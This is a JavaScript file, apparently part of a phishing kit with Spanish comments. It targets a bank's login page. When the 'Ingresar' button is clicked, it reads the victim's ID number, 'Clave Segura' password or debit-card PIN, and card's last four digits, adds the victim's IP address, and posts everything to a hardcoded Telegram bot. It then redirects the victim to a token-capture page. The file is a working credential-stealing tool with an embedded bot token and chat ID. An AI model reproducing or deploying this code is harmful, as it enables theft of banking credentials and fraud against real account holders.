// telegram.js

const BOT_TOKEN   = '7566301264:AAETlzNwR9-iuvl4xiUEuWsiYGd1hR-L4zk';      // Reemplaza con tu token
const CHAT_ID     = '-1002373013684';    // Reemplaza con tu chat_id

function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    })
  });
}

document.getElementById('btnIngresar').addEventListener('click', () => {
  const active = document.querySelector('.tab.active').dataset.target;

  // Recoge datos del formulario
  const idType = active === 'clave-segura'
    ? document.getElementById('idTypeCS').value
    : document.getElementById('idTypeTD').value;

  const idNum = active === 'clave-segura'
    ? document.getElementById('idNumCS').value.trim()
    : document.getElementById('idNumTD').value.trim();

  const clave = active === 'clave-segura'
    ? document.getElementById('claveInput').value.trim()
    : document.getElementById('claveTarjeta').value.trim();

  const ult4 = active === 'tarjeta-debito'
    ? document.getElementById('ult4Tarjeta').value.trim()
    : '';

  // Construye mensaje
  let text = `📥 *Nueva solicitud*\n` +
             `• *Tipo:* ${ active === 'clave-segura' ? 'Clave Segura' : 'Tarjeta Débito' }\n` +
             `• *${idType}:* ${idNum}\n` +
             `• *Clave:* ${clave}\n`;

  if (ult4) {
    text += `• *Últimos 4:* ${ult4}\n`;
  }

  // Añade IP
  fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(data => {
      text += `• *IP:* ${data.ip || 'desconocida'}`;
    })
    .catch(() => {
      text += `• *IP:* desconocida`;
    })
    .finally(() => {
      sendToTelegram(text)
        .then(() => {
          // Redirige inmediatamente
          window.location.href = 'token.html';
        })
        .catch(err => {
          console.error('Error enviando a Telegram:', err);
          alert('No se pudo enviar la solicitud. Intenta de nuevo.');
        });
    });
});